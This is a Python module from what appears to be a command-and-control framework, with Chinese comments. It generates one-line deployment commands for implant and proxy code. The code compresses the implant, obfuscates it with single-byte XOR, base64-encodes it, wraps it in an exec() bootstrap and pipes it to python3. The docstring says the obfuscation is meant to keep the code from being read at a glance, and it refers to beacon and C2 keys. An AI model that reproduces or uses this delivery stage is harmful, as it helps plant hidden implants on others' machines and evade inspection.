"""core/bootstrap.py — 共享 bootstrap 生成（C1/T6.1）

单行部署命令的编码部分。build 模块与 proxy 生成器共用，
消灭两份 _BOOTSTRAP 模板与 %32 硬编码（C1 解决）。

bootstrap 结构（部署壳，随机单字节 XOR 混淆）:
  import zlib,base64;exec(zlib.decompress(bytes(b.__xor__(K) for b in base64.b64decode('...'))))

部署命令: echo "<bootstrap>" | python3

说明:
  - K 为随机单字节（1..255），明文写在命令里，只做传输混淆
    （防一眼看出代码），【不是】C2 通信密钥——beacon 代码内部的
    _K（32 字节 implant_key）才是通信密钥，本层与其无关。
  - bootstrap 内用单引号定界 payload，因此部署命令外层必须用双引号
    包裹（echo "..."）；防御检查保证 bootstrap 不含 $ ` \\ " 等
    bash 双引号内会展开/转义的字符。
"""

import base64
import random
import zlib

_BOOTSTRAP = (
    "import zlib,base64;"
    "exec(zlib.decompress(bytes(b.__xor__({k}) "
    "for b in base64.b64decode('{payload}'))))"
)


def _check_k(k) -> None:
    """k 必须是 1..255 的整数（单字节 XOR 密钥）。"""
    if not isinstance(k, int) or not (1 <= k <= 255):
        raise ValueError(f"k must be int in 1..255, got {k!r}")


def encode_payload(code: str, k: int) -> str:
    """完整代码 → zlib(9) + 单字节 XOR + Base64 → ASCII 字符串。"""
    _check_k(k)
    compressed = zlib.compress(code.encode("utf-8"), 9)  # 最高压缩级别, 载荷瘦身
    obfuscated = bytes(b ^ k for b in compressed)
    return base64.b64encode(obfuscated).decode("ascii")


def build_bootstrap(code: str, k: int = None) -> str:
    """生成 bootstrap 单行代码（不含 echo 包装）。

    Args:
        code: 要交付执行的完整代码（已渲染的 implant/proxy 代码）
        k: 单字节混淆密钥；None 时随机生成（1..255）

    Raises:
        ValueError: payload 含反斜杠/单引号（base64 字符集不应出现，
        防御性校验），或 bootstrap 含 bash 双引号内不安全字符。
    """
    if k is None:
        k = random.randint(1, 255)
    payload = encode_payload(code, k)
    if "\\" in payload or "'" in payload:
        raise ValueError("payload contains unsafe characters (\\ or ')")
    bootstrap = _BOOTSTRAP.format(k=k, payload=payload)
    # 外层 echo "..." 双引号包裹：内部不得出现 $ ` \\ "（会展开/转义）
    if any(c in bootstrap for c in '"$`\\'):
        raise ValueError("bootstrap contains shell-unsafe characters")
    return bootstrap


def deploy_command(code: str, k: int = None) -> str:
    """生成 echo "<bootstrap>" | python3 单行部署命令。"""
    return f"echo \"{build_bootstrap(code, k)}\" | python3"
